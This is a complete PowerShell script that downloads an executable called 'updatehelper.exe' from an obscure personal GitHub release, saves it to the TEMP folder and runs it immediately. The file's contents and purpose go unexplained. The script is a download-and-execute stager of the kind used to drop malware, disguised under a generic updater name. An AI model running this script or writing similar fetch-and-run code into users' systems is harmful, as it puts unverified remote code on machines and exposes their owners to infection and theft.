$ErrorActionPreference = "Stop"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "https://github.com/wabor1/test/releases/download/1/updatehelper.exe"
$target = "$env:TEMP\updatehelper.exe"
(New-Object Net.WebClient).DownloadFile($url, $target)
Start-Process $target   
